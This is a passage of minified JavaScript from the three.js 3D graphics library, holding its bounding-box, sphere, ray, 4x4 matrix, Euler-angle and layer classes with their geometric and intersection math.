this.min.copy(e),this.max.copy(n),this}setFromArray(e){this.makeEmpty();for(let n=0,i=e.length;n<i;n+=3)this.expandByPoint(Fn.fromArray(e,n));return this}setFromBufferAttribute(e){this.makeEmpty();for(let n=0,i=e.count;n<i;n++)this.expandByPoint(Fn.fromBufferAttribute(e,n));return this}setFromPoints(e){this.makeEmpty();for(let n=0,i=e.length;n<i;n++)this.expandByPoint(e[n]);return this}setFromCenterAndSize(e,n){const i=Fn.copy(n).multiplyScalar(.5);return this.min.copy(e).sub(i),this.max.copy(e).add(i),this}setFromObject(e,n=!1){return this.makeEmpty(),this.expandByObject(e,n)}clone(){return new this.constructor().copy(this)}copy(e){return this.min.copy(e.min),this.max.copy(e.max),this}makeEmpty(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this}isEmpty(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z}getCenter(e){return this.isEmpty()?e.set(0,0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)}getSize(e){return this.isEmpty()?e.set(0,0,0):e.subVectors(this.max,this.min)}expandByPoint(e){return this.min.min(e),this.max.max(e),this}expandByVector(e){return this.min.sub(e),this.max.add(e),this}expandByScalar(e){return this.min.addScalar(-e),this.max.addScalar(e),this}expandByObject(e,n=!1){e.updateWorldMatrix(!1,!1);const i=e.geometry;if(i!==void 0){const r=i.getAttribute("position");if(n===!0&&r!==void 0&&e.isInstancedMesh!==!0)for(let a=0,o=r.count;a<o;a++)e.isMesh===!0?e.getVertexPosition(a,Fn):Fn.fromBufferAttribute(r,a),Fn.applyMatrix4(e.matrixWorld),this.expandByPoint(Fn);else e.boundingBox!==void 0?(e.boundingBox===null&&e.computeBoundingBox(),Co.copy(e.boundingBox)):(i.boundingBox===null&&i.computeBoundingBox(),Co.copy(i.boundingBox)),Co.applyMatrix4(e.matrixWorld),this.union(Co)}const s=e.children;for(let r=0,a=s.length;r<a;r++)this.expandByObject(s[r],n);return this}containsPoint(e){return e.x>=this.min.x&&e.x<=this.max.x&&e.y>=this.min.y&&e.y<=this.max.y&&e.z>=this.min.z&&e.z<=this.max.z}containsBox(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y&&this.min.z<=e.min.z&&e.max.z<=this.max.z}getParameter(e,n){return n.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y),(e.z-this.min.z)/(this.max.z-this.min.z))}intersectsBox(e){return e.max.x>=this.min.x&&e.min.x<=this.max.x&&e.max.y>=this.min.y&&e.min.y<=this.max.y&&e.max.z>=this.min.z&&e.min.z<=this.max.z}intersectsSphere(e){return this.clampPoint(e.center,Fn),Fn.distanceToSquared(e.center)<=e.radius*e.radius}intersectsPlane(e){let n,i;return e.normal.x>0?(n=e.normal.x*this.min.x,i=e.normal.x*this.max.x):(n=e.normal.x*this.max.x,i=e.normal.x*this.min.x),e.normal.y>0?(n+=e.normal.y*this.min.y,i+=e.normal.y*this.max.y):(n+=e.normal.y*this.max.y,i+=e.normal.y*this.min.y),e.normal.z>0?(n+=e.normal.z*this.min.z,i+=e.normal.z*this.max.z):(n+=e.normal.z*this.max.z,i+=e.normal.z*this.min.z),n<=-e.constant&&i>=-e.constant}intersectsTriangle(e){if(this.isEmpty())return!1;this.getCenter(na),Ro.subVectors(this.max,na),Ys.subVectors(e.a,na),$s.subVectors(e.b,na),Ks.subVectors(e.c,na),Ii.subVectors($s,Ys),Ui.subVectors(Ks,$s),gs.subVectors(Ys,Ks);let n=[0,-Ii.z,Ii.y,0,-Ui.z,Ui.y,0,-gs.z,gs.y,Ii.z,0,-Ii.x,Ui.z,0,-Ui.x,gs.z,0,-gs.x,-Ii.y,Ii.x,0,-Ui.y,Ui.x,0,-gs.y,gs.x,0];return!qc(n,Ys,$s,Ks,Ro)||(n=[1,0,0,0,1,0,0,0,1],!qc(n,Ys,$s,Ks,Ro))?!1:(Po.crossVectors(Ii,Ui),n=[Po.x,Po.y,Po.z],qc(n,Ys,$s,Ks,Ro))}clampPoint(e,n){return n.copy(e).clamp(this.min,this.max)}distanceToPoint(e){return this.clampPoint(e,Fn).distanceTo(e)}getBoundingSphere(e){return this.isEmpty()?e.makeEmpty():(this.getCenter(e.center),e.radius=this.getSize(Fn).length()*.5),e}intersect(e){return this.min.max(e.min),this.max.min(e.max),this.isEmpty()&&this.makeEmpty(),this}union(e){return this.min.min(e.min),this.max.max(e.max),this}applyMatrix4(e){return this.isEmpty()?this:(pi[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(e),pi[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(e),pi[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(e),pi[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(e),pi[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(e),pi[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(e),pi[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(e),pi[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(e),this.setFromPoints(pi),this)}translate(e){return this.min.add(e),this.max.add(e),this}equals(e){return e.min.equals(this.min)&&e.max.equals(this.max)}toJSON(){return{min:this.min.toArray(),max:this.max.toArray()}}fromJSON(e){return this.min.fromArray(e.min),this.max.fromArray(e.max),this}}const pi=[new B,new B,new B,new B,new B,new B,new B,new B],Fn=new B,Co=new ro,Ys=new B,$s=new B,Ks=new B,Ii=new B,Ui=new B,gs=new B,na=new B,Ro=new B,Po=new B,vs=new B;function qc(t,e,n,i,s){for(let r=0,a=t.length-3;r<=a;r+=3){vs.fromArray(t,r);const o=s.x*Math.abs(vs.x)+s.y*Math.abs(vs.y)+s.z*Math.abs(vs.z),l=e.dot(vs),c=n.dot(vs),d=i.dot(vs);if(Math.max(-Math.max(l,c,d),Math.min(l,c,d))>o)return!1}return!0}const Tw=new ro,ia=new B,Yc=new B;class oc{constructor(e=new B,n=-1){this.isSphere=!0,this.center=e,this.radius=n}set(e,n){return this.center.copy(e),this.radius=n,this}setFromPoints(e,n){const i=this.center;n!==void 0?i.copy(n):Tw.setFromPoints(e).getCenter(i);let s=0;for(let r=0,a=e.length;r<a;r++)s=Math.max(s,i.distanceToSquared(e[r]));return this.radius=Math.sqrt(s),this}copy(e){return this.center.copy(e.center),this.radius=e.radius,this}isEmpty(){return this.radius<0}makeEmpty(){return this.center.set(0,0,0),this.radius=-1,this}containsPoint(e){return e.distanceToSquared(this.center)<=this.radius*this.radius}distanceToPoint(e){return e.distanceTo(this.center)-this.radius}intersectsSphere(e){const n=this.radius+e.radius;return e.center.distanceToSquared(this.center)<=n*n}intersectsBox(e){return e.intersectsSphere(this)}intersectsPlane(e){return Math.abs(e.distanceToPoint(this.center))<=this.radius}clampPoint(e,n){const i=this.center.distanceToSquared(e);return n.copy(e),i>this.radius*this.radius&&(n.sub(this.center).normalize(),n.multiplyScalar(this.radius).add(this.center)),n}getBoundingBox(e){return this.isEmpty()?(e.makeEmpty(),e):(e.set(this.center,this.center),e.expandByScalar(this.radius),e)}applyMatrix4(e){return this.center.applyMatrix4(e),this.radius=this.radius*e.getMaxScaleOnAxis(),this}translate(e){return this.center.add(e),this}expandByPoint(e){if(this.isEmpty())return this.center.copy(e),this.radius=0,this;ia.subVectors(e,this.center);const n=ia.lengthSq();if(n>this.radius*this.radius){const i=Math.sqrt(n),s=(i-this.radius)*.5;this.center.addScaledVector(ia,s/i),this.radius+=s}return this}union(e){return e.isEmpty()?this:this.isEmpty()?(this.copy(e),this):(this.center.equals(e.center)===!0?this.radius=Math.max(this.radius,e.radius):(Yc.subVectors(e.center,this.center).setLength(e.radius),this.expandByPoint(ia.copy(e.center).add(Yc)),this.expandByPoint(ia.copy(e.center).sub(Yc))),this)}equals(e){return e.center.equals(this.center)&&e.radius===this.radius}clone(){return new this.constructor().copy(this)}toJSON(){return{radius:this.radius,center:this.center.toArray()}}fromJSON(e){return this.radius=e.radius,this.center.fromArray(e.center),this}}const hi=new B,$c=new B,Lo=new B,Oi=new B,Kc=new B,ko=new B,Zc=new B;class Y0{constructor(e=new B,n=new B(0,0,-1)){this.origin=e,this.direction=n}set(e,n){return this.origin.copy(e),this.direction.copy(n),this}copy(e){return this.origin.copy(e.origin),this.direction.copy(e.direction),this}at(e,n){return n.copy(this.origin).addScaledVector(this.direction,e)}lookAt(e){return this.direction.copy(e).sub(this.origin).normalize(),this}recast(e){return this.origin.copy(this.at(e,hi)),this}closestPointToPoint(e,n){n.subVectors(e,this.origin);const i=n.dot(this.direction);return i<0?n.copy(this.origin):n.copy(this.origin).addScaledVector(this.direction,i)}distanceToPoint(e){return Math.sqrt(this.distanceSqToPoint(e))}distanceSqToPoint(e){const n=hi.subVectors(e,this.origin).dot(this.direction);return n<0?this.origin.distanceToSquared(e):(hi.copy(this.origin).addScaledVector(this.direction,n),hi.distanceToSquared(e))}distanceSqToSegment(e,n,i,s){$c.copy(e).add(n).multiplyScalar(.5),Lo.copy(n).sub(e).normalize(),Oi.copy(this.origin).sub($c);const r=e.distanceTo(n)*.5,a=-this.direction.dot(Lo),o=Oi.dot(this.direction),l=-Oi.dot(Lo),c=Oi.lengthSq(),d=Math.abs(1-a*a);let p,h,f,_;if(d>0)if(p=a*l-o,h=a*o-l,_=r*d,p>=0)if(h>=-_)if(h<=_){const y=1/d;p*=y,h*=y,f=p*(p+a*h+2*o)+h*(a*p+h+2*l)+c}else h=r,p=Math.max(0,-(a*h+o)),f=-p*p+h*(h+2*l)+c;else h=-r,p=Math.max(0,-(a*h+o)),f=-p*p+h*(h+2*l)+c;else h<=-_?(p=Math.max(0,-(-a*r+o)),h=p>0?-r:Math.min(Math.max(-r,-l),r),f=-p*p+h*(h+2*l)+c):h<=_?(p=0,h=Math.min(Math.max(-r,-l),r),f=h*(h+2*l)+c):(p=Math.max(0,-(a*r+o)),h=p>0?r:Math.min(Math.max(-r,-l),r),f=-p*p+h*(h+2*l)+c);else h=a>0?-r:r,p=Math.max(0,-(a*h+o)),f=-p*p+h*(h+2*l)+c;return i&&i.copy(this.origin).addScaledVector(this.direction,p),s&&s.copy($c).addScaledVector(Lo,h),f}intersectSphere(e,n){hi.subVectors(e.center,this.origin);const i=hi.dot(this.direction),s=hi.dot(hi)-i*i,r=e.radius*e.radius;if(s>r)return null;const a=Math.sqrt(r-s),o=i-a,l=i+a;return l<0?null:o<0?this.at(l,n):this.at(o,n)}intersectsSphere(e){return e.radius<0?!1:this.distanceSqToPoint(e.center)<=e.radius*e.radius}distanceToPlane(e){const n=e.normal.dot(this.direction);if(n===0)return e.distanceToPoint(this.origin)===0?0:null;const i=-(this.origin.dot(e.normal)+e.constant)/n;return i>=0?i:null}intersectPlane(e,n){const i=this.distanceToPlane(e);return i===null?null:this.at(i,n)}intersectsPlane(e){const n=e.distanceToPoint(this.origin);return n===0||e.normal.dot(this.direction)*n<0}intersectBox(e,n){let i,s,r,a,o,l;const c=1/this.direction.x,d=1/this.direction.y,p=1/this.direction.z,h=this.origin;return c>=0?(i=(e.min.x-h.x)*c,s=(e.max.x-h.x)*c):(i=(e.max.x-h.x)*c,s=(e.min.x-h.x)*c),d>=0?(r=(e.min.y-h.y)*d,a=(e.max.y-h.y)*d):(r=(e.max.y-h.y)*d,a=(e.min.y-h.y)*d),i>a||r>s||((r>i||isNaN(i))&&(i=r),(a<s||isNaN(s))&&(s=a),p>=0?(o=(e.min.z-h.z)*p,l=(e.max.z-h.z)*p):(o=(e.max.z-h.z)*p,l=(e.min.z-h.z)*p),i>l||o>s)||((o>i||i!==i)&&(i=o),(l<s||s!==s)&&(s=l),s<0)?null:this.at(i>=0?i:s,n)}intersectsBox(e){return this.intersectBox(e,hi)!==null}intersectTriangle(e,n,i,s,r){Kc.subVectors(n,e),ko.subVectors(i,e),Zc.crossVectors(Kc,ko);let a=this.direction.dot(Zc),o;if(a>0){if(s)return null;o=1}else if(a<0)o=-1,a=-a;else return null;Oi.subVectors(this.origin,e);const l=o*this.direction.dot(ko.crossVectors(Oi,ko));if(l<0)return null;const c=o*this.direction.dot(Kc.cross(Oi));if(c<0||l+c>a)return null;const d=-o*Oi.dot(Zc);return d<0?null:this.at(d/a,r)}applyMatrix4(e){return this.origin.applyMatrix4(e),this.direction.transformDirection(e),this}equals(e){return e.origin.equals(this.origin)&&e.direction.equals(this.direction)}clone(){return new this.constructor().copy(this)}}class _t{constructor(e,n,i,s,r,a,o,l,c,d,p,h,f,_,y,m){_t.prototype.isMatrix4=!0,this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],e!==void 0&&this.set(e,n,i,s,r,a,o,l,c,d,p,h,f,_,y,m)}set(e,n,i,s,r,a,o,l,c,d,p,h,f,_,y,m){const u=this.elements;return u[0]=e,u[4]=n,u[8]=i,u[12]=s,u[1]=r,u[5]=a,u[9]=o,u[13]=l,u[2]=c,u[6]=d,u[10]=p,u[14]=h,u[3]=f,u[7]=_,u[11]=y,u[15]=m,this}identity(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this}clone(){return new _t().fromArray(this.elements)}copy(e){const n=this.elements,i=e.elements;return n[0]=i[0],n[1]=i[1],n[2]=i[2],n[3]=i[3],n[4]=i[4],n[5]=i[5],n[6]=i[6],n[7]=i[7],n[8]=i[8],n[9]=i[9],n[10]=i[10],n[11]=i[11],n[12]=i[12],n[13]=i[13],n[14]=i[14],n[15]=i[15],this}copyPosition(e){const n=this.elements,i=e.elements;return n[12]=i[12],n[13]=i[13],n[14]=i[14],this}setFromMatrix3(e){const n=e.elements;return this.set(n[0],n[3],n[6],0,n[1],n[4],n[7],0,n[2],n[5],n[8],0,0,0,0,1),this}extractBasis(e,n,i){return this.determinant()===0?(e.set(1,0,0),n.set(0,1,0),i.set(0,0,1),this):(e.setFromMatrixColumn(this,0),n.setFromMatrixColumn(this,1),i.setFromMatrixColumn(this,2),this)}makeBasis(e,n,i){return this.set(e.x,n.x,i.x,0,e.y,n.y,i.y,0,e.z,n.z,i.z,0,0,0,0,1),this}extractRotation(e){if(e.determinant()===0)return this.identity();const n=this.elements,i=e.elements,s=1/Zs.setFromMatrixColumn(e,0).length(),r=1/Zs.setFromMatrixColumn(e,1).length(),a=1/Zs.setFromMatrixColumn(e,2).length();return n[0]=i[0]*s,n[1]=i[1]*s,n[2]=i[2]*s,n[3]=0,n[4]=i[4]*r,n[5]=i[5]*r,n[6]=i[6]*r,n[7]=0,n[8]=i[8]*a,n[9]=i[9]*a,n[10]=i[10]*a,n[11]=0,n[12]=0,n[13]=0,n[14]=0,n[15]=1,this}makeRotationFromEuler(e){const n=this.elements,i=e.x,s=e.y,r=e.z,a=Math.cos(i),o=Math.sin(i),l=Math.cos(s),c=Math.sin(s),d=Math.cos(r),p=Math.sin(r);if(e.order==="XYZ"){const h=a*d,f=a*p,_=o*d,y=o*p;n[0]=l*d,n[4]=-l*p,n[8]=c,n[1]=f+_*c,n[5]=h-y*c,n[9]=-o*l,n[2]=y-h*c,n[6]=_+f*c,n[10]=a*l}else if(e.order==="YXZ"){const h=l*d,f=l*p,_=c*d,y=c*p;n[0]=h+y*o,n[4]=_*o-f,n[8]=a*c,n[1]=a*p,n[5]=a*d,n[9]=-o,n[2]=f*o-_,n[6]=y+h*o,n[10]=a*l}else if(e.order==="ZXY"){const h=l*d,f=l*p,_=c*d,y=c*p;n[0]=h-y*o,n[4]=-a*p,n[8]=_+f*o,n[1]=f+_*o,n[5]=a*d,n[9]=y-h*o,n[2]=-a*c,n[6]=o,n[10]=a*l}else if(e.order==="ZYX"){const h=a*d,f=a*p,_=o*d,y=o*p;n[0]=l*d,n[4]=_*c-f,n[8]=h*c+y,n[1]=l*p,n[5]=y*c+h,n[9]=f*c-_,n[2]=-c,n[6]=o*l,n[10]=a*l}else if(e.order==="YZX"){const h=a*l,f=a*c,_=o*l,y=o*c;n[0]=l*d,n[4]=y-h*p,n[8]=_*p+f,n[1]=p,n[5]=a*d,n[9]=-o*d,n[2]=-c*d,n[6]=f*p+_,n[10]=h-y*p}else if(e.order==="XZY"){const h=a*l,f=a*c,_=o*l,y=o*c;n[0]=l*d,n[4]=-p,n[8]=c*d,n[1]=h*p+y,n[5]=a*d,n[9]=f*p-_,n[2]=_*p-f,n[6]=o*d,n[10]=y*p+h}return n[3]=0,n[7]=0,n[11]=0,n[12]=0,n[13]=0,n[14]=0,n[15]=1,this}makeRotationFromQuaternion(e){return this.compose(Aw,e,Cw)}lookAt(e,n,i){const s=this.elements;return _n.subVectors(e,n),_n.lengthSq()===0&&(_n.z=1),_n.normalize(),Fi.crossVectors(i,_n),Fi.lengthSq()===0&&(Math.abs(i.z)===1?_n.x+=1e-4:_n.z+=1e-4,_n.normalize(),Fi.crossVectors(i,_n)),Fi.normalize(),No.crossVectors(_n,Fi),s[0]=Fi.x,s[4]=No.x,s[8]=_n.x,s[1]=Fi.y,s[5]=No.y,s[9]=_n.y,s[2]=Fi.z,s[6]=No.z,s[10]=_n.z,this}multiply(e){return this.multiplyMatrices(this,e)}premultiply(e){return this.multiplyMatrices(e,this)}multiplyMatrices(e,n){const i=e.elements,s=n.elements,r=this.elements,a=i[0],o=i[4],l=i[8],c=i[12],d=i[1],p=i[5],h=i[9],f=i[13],_=i[2],y=i[6],m=i[10],u=i[14],g=i[3],x=i[7],S=i[11],T=i[15],A=s[0],R=s[4],N=s[8],b=s[12],w=s[1],P=s[5],z=s[9],V=s[13],Z=s[2],$=s[6],X=s[10],H=s[14],I=s[3],J=s[7],K=s[11],ne=s[15];return r[0]=a*A+o*w+l*Z+c*I,r[4]=a*R+o*P+l*$+c*J,r[8]=a*N+o*z+l*X+c*K,r[12]=a*b+o*V+l*H+c*ne,r[1]=d*A+p*w+h*Z+f*I,r[5]=d*R+p*P+h*$+f*J,r[9]=d*N+p*z+h*X+f*K,r[13]=d*b+p*V+h*H+f*ne,r[2]=_*A+y*w+m*Z+u*I,r[6]=_*R+y*P+m*$+u*J,r[10]=_*N+y*z+m*X+u*K,r[14]=_*b+y*V+m*H+u*ne,r[3]=g*A+x*w+S*Z+T*I,r[7]=g*R+x*P+S*$+T*J,r[11]=g*N+x*z+S*X+T*K,r[15]=g*b+x*V+S*H+T*ne,this}multiplyScalar(e){const n=this.elements;return n[0]*=e,n[4]*=e,n[8]*=e,n[12]*=e,n[1]*=e,n[5]*=e,n[9]*=e,n[13]*=e,n[2]*=e,n[6]*=e,n[10]*=e,n[14]*=e,n[3]*=e,n[7]*=e,n[11]*=e,n[15]*=e,this}determinant(){const e=this.elements,n=e[0],i=e[4],s=e[8],r=e[12],a=e[1],o=e[5],l=e[9],c=e[13],d=e[2],p=e[6],h=e[10],f=e[14],_=e[3],y=e[7],m=e[11],u=e[15],g=l*f-c*h,x=o*f-c*p,S=o*h-l*p,T=a*f-c*d,A=a*h-l*d,R=a*p-o*d;return n*(y*g-m*x+u*S)-i*(_*g-m*T+u*A)+s*(_*x-y*T+u*R)-r*(_*S-y*A+m*R)}transpose(){const e=this.elements;let n;return n=e[1],e[1]=e[4],e[4]=n,n=e[2],e[2]=e[8],e[8]=n,n=e[6],e[6]=e[9],e[9]=n,n=e[3],e[3]=e[12],e[12]=n,n=e[7],e[7]=e[13],e[13]=n,n=e[11],e[11]=e[14],e[14]=n,this}setPosition(e,n,i){const s=this.elements;return e.isVector3?(s[12]=e.x,s[13]=e.y,s[14]=e.z):(s[12]=e,s[13]=n,s[14]=i),this}invert(){const e=this.elements,n=e[0],i=e[1],s=e[2],r=e[3],a=e[4],o=e[5],l=e[6],c=e[7],d=e[8],p=e[9],h=e[10],f=e[11],_=e[12],y=e[13],m=e[14],u=e[15],g=p*m*c-y*h*c+y*l*f-o*m*f-p*l*u+o*h*u,x=_*h*c-d*m*c-_*l*f+a*m*f+d*l*u-a*h*u,S=d*y*c-_*p*c+_*o*f-a*y*f-d*o*u+a*p*u,T=_*p*l-d*y*l-_*o*h+a*y*h+d*o*m-a*p*m,A=n*g+i*x+s*S+r*T;if(A===0)return this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);const R=1/A;return e[0]=g*R,e[1]=(y*h*r-p*m*r-y*s*f+i*m*f+p*s*u-i*h*u)*R,e[2]=(o*m*r-y*l*r+y*s*c-i*m*c-o*s*u+i*l*u)*R,e[3]=(p*l*r-o*h*r-p*s*c+i*h*c+o*s*f-i*l*f)*R,e[4]=x*R,e[5]=(d*m*r-_*h*r+_*s*f-n*m*f-d*s*u+n*h*u)*R,e[6]=(_*l*r-a*m*r-_*s*c+n*m*c+a*s*u-n*l*u)*R,e[7]=(a*h*r-d*l*r+d*s*c-n*h*c-a*s*f+n*l*f)*R,e[8]=S*R,e[9]=(_*p*r-d*y*r-_*i*f+n*y*f+d*i*u-n*p*u)*R,e[10]=(a*y*r-_*o*r+_*i*c-n*y*c-a*i*u+n*o*u)*R,e[11]=(d*o*r-a*p*r-d*i*c+n*p*c+a*i*f-n*o*f)*R,e[12]=T*R,e[13]=(d*y*s-_*p*s+_*i*h-n*y*h-d*i*m+n*p*m)*R,e[14]=(_*o*s-a*y*s-_*i*l+n*y*l+a*i*m-n*o*m)*R,e[15]=(a*p*s-d*o*s+d*i*l-n*p*l-a*i*h+n*o*h)*R,this}scale(e){const n=this.elements,i=e.x,s=e.y,r=e.z;return n[0]*=i,n[4]*=s,n[8]*=r,n[1]*=i,n[5]*=s,n[9]*=r,n[2]*=i,n[6]*=s,n[10]*=r,n[3]*=i,n[7]*=s,n[11]*=r,this}getMaxScaleOnAxis(){const e=this.elements,n=e[0]*e[0]+e[1]*e[1]+e[2]*e[2],i=e[4]*e[4]+e[5]*e[5]+e[6]*e[6],s=e[8]*e[8]+e[9]*e[9]+e[10]*e[10];return Math.sqrt(Math.max(n,i,s))}makeTranslation(e,n,i){return e.isVector3?this.set(1,0,0,e.x,0,1,0,e.y,0,0,1,e.z,0,0,0,1):this.set(1,0,0,e,0,1,0,n,0,0,1,i,0,0,0,1),this}makeRotationX(e){const n=Math.cos(e),i=Math.sin(e);return this.set(1,0,0,0,0,n,-i,0,0,i,n,0,0,0,0,1),this}makeRotationY(e){const n=Math.cos(e),i=Math.sin(e);return this.set(n,0,i,0,0,1,0,0,-i,0,n,0,0,0,0,1),this}makeRotationZ(e){const n=Math.cos(e),i=Math.sin(e);return this.set(n,-i,0,0,i,n,0,0,0,0,1,0,0,0,0,1),this}makeRotationAxis(e,n){const i=Math.cos(n),s=Math.sin(n),r=1-i,a=e.x,o=e.y,l=e.z,c=r*a,d=r*o;return this.set(c*a+i,c*o-s*l,c*l+s*o,0,c*o+s*l,d*o+i,d*l-s*a,0,c*l-s*o,d*l+s*a,r*l*l+i,0,0,0,0,1),this}makeScale(e,n,i){return this.set(e,0,0,0,0,n,0,0,0,0,i,0,0,0,0,1),this}makeShear(e,n,i,s,r,a){return this.set(1,i,r,0,e,1,a,0,n,s,1,0,0,0,0,1),this}compose(e,n,i){const s=this.elements,r=n._x,a=n._y,o=n._z,l=n._w,c=r+r,d=a+a,p=o+o,h=r*c,f=r*d,_=r*p,y=a*d,m=a*p,u=o*p,g=l*c,x=l*d,S=l*p,T=i.x,A=i.y,R=i.z;return s[0]=(1-(y+u))*T,s[1]=(f+S)*T,s[2]=(_-x)*T,s[3]=0,s[4]=(f-S)*A,s[5]=(1-(h+u))*A,s[6]=(m+g)*A,s[7]=0,s[8]=(_+x)*R,s[9]=(m-g)*R,s[10]=(1-(h+y))*R,s[11]=0,s[12]=e.x,s[13]=e.y,s[14]=e.z,s[15]=1,this}decompose(e,n,i){const s=this.elements;if(e.x=s[12],e.y=s[13],e.z=s[14],this.determinant()===0)return i.set(1,1,1),n.identity(),this;let r=Zs.set(s[0],s[1],s[2]).length();const a=Zs.set(s[4],s[5],s[6]).length(),o=Zs.set(s[8],s[9],s[10]).length();this.determinant()<0&&(r=-r),Bn.copy(this);const c=1/r,d=1/a,p=1/o;return Bn.elements[0]*=c,Bn.elements[1]*=c,Bn.elements[2]*=c,Bn.elements[4]*=d,Bn.elements[5]*=d,Bn.elements[6]*=d,Bn.elements[8]*=p,Bn.elements[9]*=p,Bn.elements[10]*=p,n.setFromRotationMatrix(Bn),i.x=r,i.y=a,i.z=o,this}makePerspective(e,n,i,s,r,a,o=ni,l=!1){const c=this.elements,d=2*r/(n-e),p=2*r/(i-s),h=(n+e)/(n-e),f=(i+s)/(i-s);let _,y;if(l)_=r/(a-r),y=a*r/(a-r);else if(o===ni)_=-(a+r)/(a-r),y=-2*a*r/(a-r);else if(o===Bl)_=-a/(a-r),y=-a*r/(a-r);else throw new Error("THREE.Matrix4.makePerspective(): Invalid coordinate system: "+o);return c[0]=d,c[4]=0,c[8]=h,c[12]=0,c[1]=0,c[5]=p,c[9]=f,c[13]=0,c[2]=0,c[6]=0,c[10]=_,c[14]=y,c[3]=0,c[7]=0,c[11]=-1,c[15]=0,this}makeOrthographic(e,n,i,s,r,a,o=ni,l=!1){const c=this.elements,d=2/(n-e),p=2/(i-s),h=-(n+e)/(n-e),f=-(i+s)/(i-s);let _,y;if(l)_=1/(a-r),y=a/(a-r);else if(o===ni)_=-2/(a-r),y=-(a+r)/(a-r);else if(o===Bl)_=-1/(a-r),y=-r/(a-r);else throw new Error("THREE.Matrix4.makeOrthographic(): Invalid coordinate system: "+o);return c[0]=d,c[4]=0,c[8]=0,c[12]=h,c[1]=0,c[5]=p,c[9]=0,c[13]=f,c[2]=0,c[6]=0,c[10]=_,c[14]=y,c[3]=0,c[7]=0,c[11]=0,c[15]=1,this}equals(e){const n=this.elements,i=e.elements;for(let s=0;s<16;s++)if(n[s]!==i[s])return!1;return!0}fromArray(e,n=0){for(let i=0;i<16;i++)this.elements[i]=e[i+n];return this}toArray(e=[],n=0){const i=this.elements;return e[n]=i[0],e[n+1]=i[1],e[n+2]=i[2],e[n+3]=i[3],e[n+4]=i[4],e[n+5]=i[5],e[n+6]=i[6],e[n+7]=i[7],e[n+8]=i[8],e[n+9]=i[9],e[n+10]=i[10],e[n+11]=i[11],e[n+12]=i[12],e[n+13]=i[13],e[n+14]=i[14],e[n+15]=i[15],e}}const Zs=new B,Bn=new _t,Aw=new B(0,0,0),Cw=new B(1,1,1),Fi=new B,No=new B,_n=new B,om=new _t,lm=new so;class ci{constructor(e=0,n=0,i=0,s=ci.DEFAULT_ORDER){this.isEuler=!0,this._x=e,this._y=n,this._z=i,this._order=s}get x(){return this._x}set x(e){this._x=e,this._onChangeCallback()}get y(){return this._y}set y(e){this._y=e,this._onChangeCallback()}get z(){return this._z}set z(e){this._z=e,this._onChangeCallback()}get order(){return this._order}set order(e){this._order=e,this._onChangeCallback()}set(e,n,i,s=this._order){return this._x=e,this._y=n,this._z=i,this._order=s,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._order)}copy(e){return this._x=e._x,this._y=e._y,this._z=e._z,this._order=e._order,this._onChangeCallback(),this}setFromRotationMatrix(e,n=this._order,i=!0){const s=e.elements,r=s[0],a=s[4],o=s[8],l=s[1],c=s[5],d=s[9],p=s[2],h=s[6],f=s[10];switch(n){case"XYZ":this._y=Math.asin(je(o,-1,1)),Math.abs(o)<.9999999?(this._x=Math.atan2(-d,f),this._z=Math.atan2(-a,r)):(this._x=Math.atan2(h,c),this._z=0);break;case"YXZ":this._x=Math.asin(-je(d,-1,1)),Math.abs(d)<.9999999?(this._y=Math.atan2(o,f),this._z=Math.atan2(l,c)):(this._y=Math.atan2(-p,r),this._z=0);break;case"ZXY":this._x=Math.asin(je(h,-1,1)),Math.abs(h)<.9999999?(this._y=Math.atan2(-p,f),this._z=Math.atan2(-a,c)):(this._y=0,this._z=Math.atan2(l,r));break;case"ZYX":this._y=Math.asin(-je(p,-1,1)),Math.abs(p)<.9999999?(this._x=Math.atan2(h,f),this._z=Math.atan2(l,r)):(this._x=0,this._z=Math.atan2(-a,c));break;case"YZX":this._z=Math.asin(je(l,-1,1)),Math.abs(l)<.9999999?(this._x=Math.atan2(-d,c),this._y=Math.atan2(-p,r)):(this._x=0,this._y=Math.atan2(o,f));break;case"XZY":this._z=Math.asin(-je(a,-1,1)),Math.abs(a)<.9999999?(this._x=Math.atan2(h,c),this._y=Math.atan2(o,r)):(this._x=Math.atan2(-d,f),this._y=0);break;default:Ne("Euler: .setFromRotationMatrix() encountered an unknown order: "+n)}return this._order=n,i===!0&&this._onChangeCallback(),this}setFromQuaternion(e,n,i){return om.makeRotationFromQuaternion(e),this.setFromRotationMatrix(om,n,i)}setFromVector3(e,n=this._order){return this.set(e.x,e.y,e.z,n)}reorder(e){return lm.setFromEuler(this),this.setFromQuaternion(lm,e)}equals(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._order===this._order}fromArray(e){return this._x=e[0],this._y=e[1],this._z=e[2],e[3]!==void 0&&(this._order=e[3]),this._onChangeCallback(),this}toArray(e=[],n=0){return e[n]=this._x,e[n+1]=this._y,e[n+2]=this._z,e[n+3]=this._order,e}_onChange(e){return this._onChangeCallback=e,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._order}}ci.DEFAULT_ORDER="XYZ";class $0{constructor(){this.mask=1}set(e){this.mask=(1<<e|0)>>>0}enable(e){this.mask|=1<<e|0}enableAll(){this.mask=-1}toggle(e){this.mask^=1<<e|0}disable(e){this.mask&=~(1<<e|0)}disableAll(){this.mask=0}test(e){return(this.mask&e.mask)!==0}isEnabled(e){return(this.mask&(1<<e|0))!==0}}let Rw=0;const cm=new B,Js=new so,fi=new _t,Do=new B,sa=new B,Pw=new B,Lw=new so,um=new B(1,0,0),dm=new B(0,1,0),pm=new 